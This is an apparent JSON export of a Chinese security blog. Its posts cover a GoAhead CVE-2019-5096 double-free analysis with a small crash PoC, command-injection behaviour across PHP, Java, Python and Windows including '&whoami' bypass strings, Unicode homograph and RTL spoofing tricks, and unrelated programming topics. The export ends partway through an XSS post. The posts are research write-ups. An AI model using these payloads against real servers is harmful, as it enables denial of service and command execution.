{"meta":{"title":"Lyle's Blog","subtitle":null,"description":null,"author":"Lyle","url":"https://LyleMi.github.io"},"pages":[],"posts":[{"title":"CVE-2019-5096 GoAhead Double Free 漏洞分析","slug":"2020-06-30-cve-2019-5096","date":"2020-06-30T11:34:20.000Z","updated":"2020-06-30T11:42:00.725Z","comments":true,"path":"2020/06/30/2020-06-30-cve-2019-5096/","link":"","permalink":"https://LyleMi.github.io/2020/06/30/2020-06-30-cve-2019-5096/","excerpt":"简介GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器，提供开源和企业版本，用于全球数亿台设备中。CVE-2019-5096由思科 Talos 团队的研究员发现，可以在Pre-Auth的条件下触发漏洞。","text":"简介GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器，提供开源和企业版本，用于全球数亿台设备中。CVE-2019-5096由思科 Talos 团队的研究员发现，可以在Pre-Auth的条件下触发漏洞。 时间线 报告漏洞 2019-08-28 漏洞修复 2019-11-21 漏洞公开 2019-12-02 漏洞影响范围 GoAhead 5.0.1 GoAhead 3.6.5 GoAhead 4.1.1 复现PoC1234567import requestsurl = 'http://127.0.0.1:8777'files = &#123; \"file1\": ('filename', 'data'), \"file2\": ('filename', 'data'),&#125;r = requests.post(url, files=files) 调用栈123456789101112131415161718...#2 0x00007ffff77c17ea in __libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7ffff78daed8 &quot;*** Error in `%s&apos;: %s: 0x%s ***\\n&quot;) at ../sysdeps/posix/libc_fatal.c:175#3 0x00007ffff77ca37a in malloc_printerr (ar_ptr=&lt;optimized out&gt;, ptr=&lt;optimized out&gt;, str=0x7ffff78dafe8 &quot;double free or corruption (out)&quot;, action=0x3) at malloc.c:5006#4 _int_free (av=&lt;optimized out&gt;, p=&lt;optimized out&gt;, have_lock=0x0) at malloc.c:3867#5 0x00007ffff77ce53c in __GI___libc_free (mem=&lt;optimized out&gt;) at malloc.c:2968#6 0x00007ffff7b2ee1c in wfree (mem=0x611260) at src/alloc.c:292#7 0x00007ffff7b4f1ba in freeUploadFile (up=0x6112a0) at src/upload.c:71#8 0x00007ffff7b4f236 in websFreeUpload (wp=0x60cbd0) at src/upload.c:88#9 0x00007ffff7b363c5 in termWebs (wp=0x60cbd0, reuse=0x0) at src/http.c:518#10 0x00007ffff7b365de in websFree (wp=0x60cbd0) at src/http.c:561#11 0x00007ffff7b3bc0b in checkTimeout (arg=0x60cbd0, id=0x1) at src/http.c:2362#12 0x00007ffff7b45785 in callEvent (id=0x1) at src/runtime.c:232#13 0x00007ffff7b459a5 in websRunEvents () at src/runtime.c:295#14 0x00007ffff7b38e82 in websServiceEvents (finished=0x60310c &lt;finished&gt;) at src/http.c:1389#15 0x0000000000401544 in main (argc=0x4, argv=0x7fffffffe4d8, envp=0x7fffffffe500) at src/goahead.c:170... 漏洞分析函数调用流程为 websProcessUploadData initUpload processContentBoundary processUploadHeader processContentData 其中 processUploadHeader 函数会调用 freeUploadFile free 掉 wp-&gt;currentFile 1234567static void processUploadHeader(Webs *wp, char *line)&#123; ... freeUploadFile(wp-&gt;currentFile); file = wp-&gt;currentFile = walloc(sizeof(WebsUpload)); ...&#125; processContentData 函数会把上传文件加入到 wp-&gt;files 中 1234567static bool processContentData(Webs *wp)&#123; ... hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), 0); defineUploadVars(wp); ...&#125; 在请求执行完毕后，会进入 termWebs -&gt; websFreeUpload 的执行流，将 wp-&gt;files 中的 WebsUpload 对象全部 free 一次。 123456789101112131415161718192021222324PUBLIC void websFreeUpload(Webs *wp)&#123; WebsUpload *up; WebsKey *s; if (wp-&gt;files &gt;= 0) &#123; for (s = hashFirst(wp-&gt;files); s; s = hashNext(wp-&gt;files, s)) &#123; up = s-&gt;content.value.symbol; freeUploadFile(up); if (up == wp-&gt;currentFile) &#123; wp-&gt;currentFile = 0; &#125; &#125; hashFree(wp-&gt;files); &#125; if (wp-&gt;currentFile) &#123; freeUploadFile(wp-&gt;currentFile); wp-&gt;currentFile = 0; &#125; if (wp-&gt;upfd &gt;= 0) &#123; close(wp-&gt;upfd); wp-&gt;upfd = -1; &#125;&#125; 可以看到漏洞触发点是在 freeUploadFile 函数，这里仅仅检查了 up-&gt;filename 的值。但是在上传多个文件时，之前的 WebsUpload 对象被 free 掉后仍然在链表中，会触发第二次 free。 123456789101112static void freeUploadFile(WebsUpload *up)&#123; if (up) &#123; if (up-&gt;filename) &#123; unlink(up-&gt;filename); wfree(up-&gt;filename); &#125; wfree(up-&gt;clientFilename); wfree(up-&gt;contentType); wfree(up); &#125;&#125; 漏洞Patch补丁修补方式为在 processContentData 函数加入链表后置 wp-&gt;currentFile 为空。 12345678static bool processContentData(Webs *wp)&#123; ... hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), 0); defineUploadVars(wp); wp-&gt;currentFile = 0; ...&#125; 参考链接 Vulnerability Spotlight: Two vulnerabilities in EmbedThis GoAhead CVE-2019-5096：GoAhead远程代码执行漏洞分析 CVE-2019-5096","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://LyleMi.github.io/tags/CVE/"}]},{"title":"Python 进程、线程与协程","slug":"python-coroutine-thread-and-process","date":"2020-06-15T11:48:12.000Z","updated":"2020-06-15T14:04:58.443Z","comments":true,"path":"2020/06/15/python-coroutine-thread-and-process/","link":"","permalink":"https://LyleMi.github.io/2020/06/15/python-coroutine-thread-and-process/","excerpt":"0x00 序在程序开发的过程中，会遇到协程、线程与进程之间的选择问题，对这些概念有清晰了解才能写出效率更高的代码。","text":"0x00 序在程序开发的过程中，会遇到协程、线程与进程之间的选择问题，对这些概念有清晰了解才能写出效率更高的代码。 0x01 进程对操作系统来说，进程是系统进行资源分配和调度的基本单位，每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。进程内至少有一个线程，它们共享进程的地址空间，而进程有自己独立的地址空间。 在多核的场景下，如果想要充分地使用多核CPU的资源，需要使用多进程的形式。Python提供了multiprocessing作为多进程的原生实现，提供了Process、Queue、Pipe、Lock等组件来支持子进程、通信和共享数据、执行不同形式的同步。 0x02 线程线程是操作系统能够进行运算调度的最小单位，它被包含在进程之中，是进程中的实际执行单位。 CPython的线程是操作系统的原生线程。在Linux上为pthread，在Windows上为Win thread，完全由操作系统调度线程的执行。一个Python解释器进程内有一个主线程，以及多个用户程序的执行线程。 2.1 GIL需要注意的是，即使在多核心CPU平台，由于GIL的存在，也将禁止多线程的并行执行。 GIL（Global Interpreter Lock）是全局解释器锁，存在于Python解释器中，用来确保当前只有一个线程被执行。GIL的存在保证了只有正在执行的线程才可以与解释器的内核进行通信，避免了混乱。 当一个线程遇到I/O任务时，将释放GIL。I/O 密集型的多线程程序 GIL 并不是瓶颈，但是计算密集型的多线程程序 GIL 会带来较大的性能损失。 2.2 最佳线程数在开发过程中，需要考虑CPU的核心数和利用率问题，常用的一个公式是 最佳线程数目 = ( ( 线程等待时间 + 线程CPU时间 ) / 线程CPU时间 ) * CPU数目 。 0x03 协程协程（Coroutine），又称微线程、纤程，它自带CPU的上下文，是比线程更小的执行单元。 协程有极高的执行效率，因为协程间切换是由程序自身控制的，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。 Python可以基于greenlet、gevent库实现协程，也可以基于原生的yield生成器、asyncio异步协程来实现。 其中yield生成器的实现如下： 1234567891011121314151617181920212223242526def task1(): # 需要有 While True 来保证一直执行 while True: print(\"task 1 before yield\") yield print(\"task 1 after yield\")def task2(): while True: print(\"task 2 before yield\") yield print(\"task 2 after yield\") def main(): # 生成器对象 t1 = task1() t2 = task2() print(\"init\") next(t1) print(\"switch from t1 to t2\") next(t2) print(\"switch from t2 to t1\") next(t1)if __name__ == \"__main__\": main() 0x04 补充材料4.1 Amdahl 定律阿姆达尔定律（Amdahl’s law，Amdahl’s argument）是计算机科学界的经验法则，因 Gene Amdahl 而得名。它代表了处理器并行运算之后效率提升的能力。 阿姆达尔定律是计算总量不变时时的量化标准，可以使用公式 ((Ws + Wp) / (Ws + Wp / p)) 来表示。 0x05 参考链接 Python3 文档 协程与任务 Does PyPy have a GIL? Why? Amdahl’s law","categories":[{"name":"Programing","slug":"Programing","permalink":"https://LyleMi.github.io/categories/Programing/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://LyleMi.github.io/tags/Python/"}]},{"title":"基于QEMU和binfmt-misc透明运行不同架构程序","slug":"transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc","date":"2020-04-14T03:23:47.000Z","updated":"2020-04-14T12:06:31.797Z","comments":true,"path":"2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","link":"","permalink":"https://LyleMi.github.io/2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","excerpt":"0x0 序基于qemu-user在x86架构上执行mips程序时，如果调用程序调用了 execve ，默认会使用x86的ld来载入程序，并抛出 exec format error 的错误信息。查询资料后发现Linux的binfmt-misc机制可以用户透明的实现调用不同架构程序的功能，于是进行了相关的尝试，于是将尝试的过程形成这篇文章，供之后查询。","text":"0x0 序基于qemu-user在x86架构上执行mips程序时，如果调用程序调用了 execve ，默认会使用x86的ld来载入程序，并抛出 exec format error 的错误信息。查询资料后发现Linux的binfmt-misc机制可以用户透明的实现调用不同架构程序的功能，于是进行了相关的尝试，于是将尝试的过程形成这篇文章，供之后查询。 0x1 binfmt_miscLinux内核有一个名为Miscellaneous Binary Format（binfmt_misc）的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开。这种机制可以通过文件的扩展名和文件开始位置的特殊的字节（Magic Byte）来判断应该如何打开文件。 可以通过以下命令来启用这种机制 1mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc 这种方式会在系统重新启动之后失效，可以通过在 /etc/fstab 文件中加入下面这行来实现开机启动： 1none /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0 已加载的程序可以通过 ls /proc/sys/fs/binfmt_misc/ 查看。 如果要加载新文件格式，可以通过向 /proc/sys/fs/binfmt_misc/register（该文件可写不可读）中写入一行匹配规则字符串来告诉内核以什么方式打开。 1:name:type:offset:magic:mask:interpreter:flags 这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。 各个字段的意义如下： name：规则名 type：表示如何匹配被打开的文件，值为 E 或 M 。E 表示根据扩展名识别，而 M 表示根据文件特定位置的Magic Bytes来识别 offset：type字段设置成 M 之后有效，表示查找Magic Bytes的偏移，默认为0 magic：表示要匹配的Magic Bytes，type字段为 M 时，表示文件的扩展名，扩展名是大小写敏感的，不需要包含 .。type字段为 E 时，表示Magic Bytes，其中不可见字符可以通过 \\xff 的方式来输出 mask：type字段设置成 M 之后有效，长度与Magic Bytes的长度一致。如果某一位为1，表示与magic对应的位匹配，为0则忽略。默认为全部匹配 interpreter：启动文件的程序，需要是绝对路径 flags: 可选字段，控制interpreter打开文件的行为。共支持 POCF 四种flag。 P 表示 preserve-argv[0] 保留原始的 argv[0] 参数。 O 表示 open-binary ，binfmt-misc默认会传递文件的路径，而启用这个参数时，binfmt-misc会打开文件，传递文件描述符。 C 表示 credentials ，即会传递文件的 setuid 等权限，这个选项也隐含了 O 。 F 表示 fix binary ，binfmt-misc默认的行为在 spwan 进程时会延迟，这种方式可能会受到mount namespace和chroot的影响，设置 F 时会立刻打开二进制文件。 除此之外，还有一些额外的限制条件： 每一行规则字符串的长度不能超过1920个字符 Magic Bytes必须在文件头128个字节内，即说offset+sizeof(magic)不超过128 interpreter的长度不能超过127 每次成功写入一行规则，都会在 /proc/sys/fs/binfmt_misc/ 目录下，创建一个名字为输入的匹配规则字符串中 name 字段的文件。通过读取这个文件的内容，可以知道这条匹配规则当前的状态： 1cat /proc/sys/fs/binfmt_misc/&lt;name&gt; 而通过向这个文件中写入0或1，可以关闭或打开这条匹配规则，而写入-1表示彻底删除这条规则。 0x2 QEMU配置apt包中有qemu相关的binfmt-misc配置，执行 apt install qemu-user-binfmt 即可安装。以 arm 为例，其配置如下： 1234567$ cat /proc/sys/fs/binfmt_misc/qemu-armenabledinterpreter /usr/bin/qemu-armflags: OCoffset 0magic 7f454c4601010100000000000000000002002800mask ffffffffffffff00fffffffffffffffffeffffff 需要自定义部分配置时，以 qemu-mips 为例，根据上文描述的规则，一个配置如下： 1echo ':qemu-mips:M:0:\\x7f\\x45\\x4c\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08:\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xfe\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff:/qemu-mips:OC' &gt; /proc/sys/fs/binfmt_misc/register 需要注意的一点是 qemu-user-binfmt 会默认安装所有 qemu 支持的格式，如果需要自定义规则，需要先 echo -1 注销掉之前的规则。 0x3 环境配置仿真程序通常还涉及到不同架构的动态链接库，链接库的依赖有两种方式解决。一种方式是设置 QEMU_LD_PREFIX 环境变量，使得QEMU在加载程序时会在相应路径下寻找链接库。一种方式是通过 chroot ，创建一个新的 root 环境。其中要注意的是，chroot之后要注册相应的虚拟设备路径，同时 binfmt-misc 配置中的 qemu 路径也需要相应修改。 12345# 配置虚拟设备路径mount -t proc proc ./proc/mount -t sysfs sys ./sys/mount -o bind /dev ./dev/mount -o bind /dev/pts ./dev/pts 0x4 参考链接 Kernel Support for miscellaneous Binary Formats binfmt_misc wikipedia The real power of Linux executables Transparently running binaries from any architecture in Linux with QEMU and binfmt_misc linux下使用binfmt_misc设定不同二进制的打开程序","categories":[{"name":"Bin","slug":"Bin","permalink":"https://LyleMi.github.io/categories/Bin/"}],"tags":[{"name":"QEMU","slug":"QEMU","permalink":"https://LyleMi.github.io/tags/QEMU/"},{"name":"工具","slug":"工具","permalink":"https://LyleMi.github.io/tags/工具/"}]},{"title":"语言Tricks系列之一","slug":"2020-04-13-tricks-1","date":"2020-04-13T13:08:29.000Z","updated":"2020-04-14T12:06:07.086Z","comments":true,"path":"2020/04/13/2020-04-13-tricks-1/","link":"","permalink":"https://LyleMi.github.io/2020/04/13/2020-04-13-tricks-1/","excerpt":"0x0 序最近遇到了不少各种语言的trick，于是想尝试作为一个系列记录下来。一般来说，并不提倡在生产环境中使用任何一种trick，好的代码应该是清晰的、无二义性的。部分trick更属于Undefined Behavior，这些trick在不同环境、不同版本的引擎中甚至会有截然不同的表现，在生产环境中应该避免这种情况。但是安全研究、渗透的过程中，利用这样的特性完成攻击的案例并不少见，所以仅作为研究还是有一定的意义。","text":"0x0 序最近遇到了不少各种语言的trick，于是想尝试作为一个系列记录下来。一般来说，并不提倡在生产环境中使用任何一种trick，好的代码应该是清晰的、无二义性的。部分trick更属于Undefined Behavior，这些trick在不同环境、不同版本的引擎中甚至会有截然不同的表现，在生产环境中应该避免这种情况。但是安全研究、渗透的过程中，利用这样的特性完成攻击的案例并不少见，所以仅作为研究还是有一定的意义。 0x1 代码与输出于是开始此系列的第一篇： 123456789101112var a = 0;console.log(1, a);if (true) &#123; console.log(2, a); a = 1; console.log(3, a); function a() &#123; &#125; console.log(4, a); a = 21; console.log(5, a);&#125;console.log(6, a); 以上代码在最新版nodejs的输出会是 1234561 02 [Function: a]3 14 15 216 1 这里是这个结果是这样出现的： 第一次输出 0 function a() 的定义提升 a 到全局，输出 [Function: a] 全局的 a 被赋值为 1 ，在console中输出两次 局部的 a 被赋值为 21 并在console中输出 全局的 a 在console中输出 0x2 调试过程以上的整个过程可以通过两种方式确定，一种方式是 node -print-bytecode ，打印出对应的字节码进行参考，具体的字节码如下。 123456789101112131415161718192021222324252627282930313233343536373839404142StackCheckLdaZero Star r1LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [7]Star r2CallProperty1 r2, r3, r1, [3]CreateClosure [2], [9], #2Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [12]Star r2CallProperty1 r2, r3, r0, [10]LdaSmi [1]Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [16]Star r2CallProperty1 r2, r3, r0, [14]Mov r0, r1LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [20]Star r2CallProperty1 r2, r3, r1, [18]LdaSmi [21]Star r0LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [24]Star r2CallProperty1 r2, r3, r0, [22]LdaGlobal [0], [5]Star r3LdaNamedProperty r3, [1], [28]Star r2CallProperty1 r2, r3, r1, [26]LdaUndefined Return 一种方式是可以在Chrome中开启调试，可以清晰的看到局部与全局两种作用域。 0x3 参考链接 v8 interpreter-generator.cc 深入理解JS中声明提升、作用域（链）和this关键字","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"Tricks","slug":"Tricks","permalink":"https://LyleMi.github.io/tags/Tricks/"}]},{"title":"命令注入成因小谈","slug":"cmdi","date":"2019-10-19T01:23:51.000Z","updated":"2020-04-14T12:06:19.818Z","comments":true,"path":"2019/10/19/cmdi/","link":"","permalink":"https://LyleMi.github.io/2019/10/19/cmdi/","excerpt":"最近做测试的时候，发现不同平台/语言下命令注入的结果会有一定的不同，于是尝试对命令注入的成因做了一个更细致的探索。","text":"最近做测试的时候，发现不同平台/语言下命令注入的结果会有一定的不同，于是尝试对命令注入的成因做了一个更细致的探索。 语言实现PHPPHP命令执行的函数很多，其中大部分函数的实现都在 php-src/ext/standard/exec.c 中: system exec passthru proc_open shell_exec 其中 system / exec / passthru 的实现调用链都是 php_exec_ex -&gt; php_exec -&gt; VCWD_POPEN 。 proc_open 的实现在 php-src/ext/standard/proc_open.c 中，调用 execle / execl 执行 /bin/sh -c 。 popen的实现在 php-src/ext/standard/file.c 中，和 shell_exec 一样直接调用 VCWD_POPEN 。 pcntl_exec 的实现在 php-src/ext/pcntl/pcntl.c 中，调用 execve 执行 /bin/sh -c。 而 VCWD_POPEN 定义在 Zend\\zend_virtual_cwd.h 中，根据编译配置有两种实现： 123#define VCWD_POPEN(command, type) virtual_popen(command, type)// or#define VCWD_POPEN(command, type) popen(command, type) 其中 virtual_popen 在 Zend/zend_virtual_cwd.c 中 1234CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */&#123; return popen_ex(command, type, CWDG(cwd).cwd, NULL);&#125; 所以PHP中的命令执行大都只是对popen做了不同程度和形式的封装。 可以用下面这个小demo来做简单验证： 123456789101112131415161718192021222324252627&lt;?phpsystem('id');echo exec('id');passthru('id');echo shell_exec('id');$descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\"));$process = proc_open('id', $descriptorspec, $pipes);if (is_resource($process)) &#123; echo stream_get_contents($pipes[1]); fclose($pipes[1]); $return = proc_close($process);&#125;$handle = popen('/usr/bin/id 2&gt;&amp;1', 'r');$read = fread($handle, 4096);echo $read;pclose($handle);pcntl_exec('/usr/bin/id'); 执行 strace -f -e trace=execve php 1.php 可以看到6次 execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;... 的调用。 JavaJava执行系统命令使用 Runtime.getRuntime().exec 。JDK实现 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl 使用系统调用 vfork ，把所有参数直接传递至 execve 。 但是和PHP不同的是，Java并没有调用 popen ，也没有给 execve 传入 sh -c ，而是直接把参数传递至 execve 。 一个简单的demo如下 1234567891011121314151617181920import java.io.*;public class Main &#123; public static void main(String[] args) &#123; String [] cmd=&#123;\"/usr/bin/id\", \"&amp;&amp;\", \"/usr/bin/id\"&#125;; try &#123; Process proc = Runtime.getRuntime().exec(cmd); InputStream fis = proc.getInputStream(); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); String line = null; while((line=br.readLine()) != null) &#123; System.out.println(line); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 用 strace -f -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 1execve(\"/usr/bin/id\", [\"/usr/bin/id\", \"&amp;&amp;\", \"/usr/bin/id\"], [/* 22 vars */] Python跟踪程序的具体实现需要相对多的精力和时间，有一个相对简单的方式是直接使用 strace 跟踪，例如Python常用的调用是 os.system 和 subprocess.check_output 。 12345import osimport subprocessos.system('id')subprocess.check_output('id') 那么执行 strace -f -e vfork,execve python t.py ，可以发现 system 对应 execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;id&quot;] ，而 subprocess.check_output 对应 execve(&quot;/usr/bin/id&quot; 。 系统调用简单对语言实现层面做了一个了解后，不难看出，大部分语言在Linux平台下，系统调用会调用 popen ，而Windows平台下则是 CreateProcess ，而 popen 和 CreateProcess 的实现则是造成不同场景下命令注入有轻微不同的原因。 popenpopen是libc中的函数，当前版本的glibc中，popen的实现在 libio/iopopen.c 中的 _IO_new_popen 函数。这个函数的调用链是： _IO_new_popen -&gt; _IO_new_proc_open -&gt; spawn_process -&gt; __posix_spawn 最后调用了 sh -c 。 sh -c 会将之后传入的字符串当作命令执行，所以在没有做过滤的情况下，PHP的系统调用，Python的 os.system 都会出现问题。 这里有一个细节是，sh会指向 /bin/sh ，在当前版本的Linux中，/bin/sh 默认指向 /bin/dash 。 dash 编译文件的大小大概在150k左右，而我们常用的 bash 大小在 1000k 左右，很直觉的，bash 的功能会更丰富一些。 例如 dash 中没有 function 关键字支持，不支持 here string，不支持 数组，dash 不支持 ++ 操作符等，这会在一些利用了bash特性的复杂payload中造成一些不同。 还有一点需要注意的是虽然 Windows 中也提供了 _popen 作为POSIX的兼容，但是在Windows平台中， _popen 最后调用的是 CreateProcess ，因而与 Linux 平台下的表现有一定的出入。 CreateProcess上面提到在Windows中，调用链的底层会最后创建进程使用的是 CreateProcess ，在普通情况下，这个函数即使不转义也不会出现问题，但是根据Windows文档，当 CreateProcess 中的第一个参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe 。所以当调用的参数第一个是bat文件时，会变成类似 cmd.exe /c &quot;test.bat &amp; id&quot; 的调用，这样就会和 sh -c 一样引入了命令注入的潜在可能。 例如 String [] cmd={&quot;whoami&quot;, &quot;&amp;&quot;, &quot;whoami&quot;}; 并不会正确执行，这里相当于把 &amp; 作为了 whoami 的参数传递了。而 String [] cmd={&quot;sth.bat&quot;, &quot;&amp;&quot;, &quot;whoami&quot;, &quot;&amp;&quot;, &quot;whoami&quot;}; 则会执行两次 whoami 。 还有一个需要注意的特性是，和Linux不同，Windows在处理参数方面有一个特性，如果这里只加上简单的转义还是可能被绕过。例如 &lt;?php system(&#39;dir &quot;\\&quot;&amp;whoami&quot;&#39;); 在Linux中会报错，而在Windows会执行 dir 和 whoami 两条命令。 这是因为Windows在处理命令行参数时，会将 &quot; 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 &quot; ，但是对 \\&quot; 的处理有误。因此在调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 参考链接 git://git.kernel.org/pub/scm/utils/dash/dash.git http://git.savannah.gnu.org/cgit/bash.git/ https://hg.openjdk.java.net/jdk/jdk https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=vs-2019 https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"Command Injection","slug":"Command-Injection","permalink":"https://LyleMi.github.io/tags/Command-Injection/"}]},{"title":"浅谈Unicode设计的安全性","slug":"unicode-sec-1","date":"2019-06-18T14:41:40.000Z","updated":"2020-04-14T12:06:50.649Z","comments":true,"path":"2019/06/18/unicode-sec-1/","link":"","permalink":"https://LyleMi.github.io/2019/06/18/unicode-sec-1/","excerpt":"1. 简介1.1 编码在1963年，计算机使用尚不广泛，主要使用7-bit的ASCII编码（American Standard Code for Information Interchange，美国信息互换标准代码）来作为字符的编码，只支持常用的少数一些字符。但是随着计算机的不断普及，各个国家和地区开始制造自己的编码规范，同时互相不进行兼容，编码逐渐成为了一个问题。","text":"1. 简介1.1 编码在1963年，计算机使用尚不广泛，主要使用7-bit的ASCII编码（American Standard Code for Information Interchange，美国信息互换标准代码）来作为字符的编码，只支持常用的少数一些字符。但是随着计算机的不断普及，各个国家和地区开始制造自己的编码规范，同时互相不进行兼容，编码逐渐成为了一个问题。 1.2 Unicode而后ISO(International Organization for Standardization, 国际标准化组织) 开始尝试制定包含大部分字母和符号的编码，称为”Universal Multiple-Octet Coded Character Set”，简称UCS, 俗称Unicode。 Unicode实际上是一个字符和数字之间的映射关系表，并不制定实际的编码方案。因此又开始制定UTF(Unicode Transformation Formats)标准，包括UTF-8、UTF-16和UTF-32等。可以理解为Unicode是一个设计图，而UTF-X是其中一种实现。 1.3 Code Point 与 Code UnitCode Point指Unicode标准里字符的编号，比如用目前Unicode使用了0 ~ 0x10FFFF的编码范围，通常用U+xxxx来表示某个字符。 Code Unit指某种Unicode编码方式里编码一个Code Point需要的最少字节数，比如UTF-8需要最少一个字节，UTF-16 最少两个字节，UCS-2两个字节，UCS-4和UTF-32四个字节，后面三个是定长编码。 2. 视觉欺骗视觉欺骗问题是最常见的也是考虑最多的Unicode安全问题。视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等，这种现象在字体较小的情况下会更加明显，在一些文章中这种问题也被称为同形异义词(homographs)问题。 2.1 国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。 因为浏览器对国家化域名的支持，这就使得可以出现 аррӏе.com (其中I是U+04CF) 这样的域名。在地址栏中，这样的域名看上去会和 apple.com 比较相似。 注: 这个例子在Chrome中已经被修复，但是Firefox中仍然生效。 同样在Url中，一些看上去和控制字符类似的Unicode也会造成问题，例如 / 和 ⁄ (U+2044)看起来就很相似，example.com⁄evil.com 实际上是 com⁄evil.com 的子域名。同样的 ? / . / # 等类似字符也存在这样的问题。 除了上面提到的两种情况，punycode也是一种视觉欺骗的形式，punycode是域名的一种编码，会以 xn-- 开头，后面是普通的有效域名，例如 аррӏе.com 对应的punycode就是 xn--80ak6aa92e.com。当chrome认为这是一个视觉问题时，就会主动把域名以punycode显示，以减少混淆的影响。但是反过来，也能应用这种方式来实现视觉欺骗，例如 䕮䕵䕶䕱.com 的punycode形式就是 xn--google.com。 2.2 双向显示阿拉伯和希伯来语是从右往左阅读的，这在一些场景下可能造成问题。例如一个名为 txt.exe ，加入Unicode的控制字符后，在用户界面看起来是 exe.txt ，这样就有可能导致用户的误判。 2.3 数字显示一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 Unicorn Shop) 也是从Unicode背后的数字角度出发考虑问题。 3. 非视觉漏洞除了视觉漏洞之外，还有很多其他方面的漏洞。这些问题主要字符是转换导致的字符串。关于字符串处理转换的细节，可以参考我之前的这篇文章。 3.1 等价形式在WAF类处理，很容易想到的是 LocalHost 和 localhost 等同，但是 ⓛocaⓛhost 这种情景就不太容易被处理。在SSRF中的防御中，如果没有做对应的处理，这种替换就可以完成一些bypass。 3.2 字符删除例如 \\x3c\\x73\\x63\\x72\\xc2\\x69\\x70\\x74\\x3e 这个字符串中，而 \\xc2 并不是任何一个有效字符的子串，在一些处理逻辑中，可能会删除 \\xc2 这个字符，从而导致问题。 3.3 字符替换一些情况下，字符会被替换为其他的字符 如U+FFFF会被替换成 ? 这在一些 ? 有明确语义的情况下就会出现问题。 3.4 缓冲区溢出在一些大小写转换时，字符会变多，例如 &#39;ß&#39;.toUpperCase() 的运行结果是 SS。如果字符串的长度检查在大小写转换之前，就可能会存在缓冲区溢出问题。 4. 参考链接 Unicode CLDR Unicode Security Considerations Unicode Security Mechanisms Unicode isn’t harmful for health – Unicode Myths debunked and encodings demystified Unicode Security Guide 其实你并不懂 Unicode IDN Spoof漏洞自动化挖掘 Unicode等价性浅谈 Unicode Security Issues FAQ IDN Visual Security Deep Thinking ASIS CTF 2019 Unicorn Shop Write-up Black Hat","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://LyleMi.github.io/tags/Unicode/"}]},{"title":"基于污点分析的XSS漏洞辅助挖掘的一种方式","slug":"xss-auto","date":"2019-06-12T02:37:07.000Z","updated":"2020-04-14T12:06:55.238Z","comments":true,"path":"2019/06/12/xss-auto/","link":"","permalink":"https://LyleMi.github.io/2019/06/12/xss-auto/","excerpt":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。","text":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。 在上文中有提到到，漏洞可以认为是输入到危险函数的过程，所以这篇文章涉及到的主要是输入、危险函数、具体实现这三个部分。 输入作为污点来源的输入主要考虑当前状态、网络请求和存储函数三个来源。 当前状态主要指像窗口名、当前Url、Hash、referr等，具体对应如下这些变量： 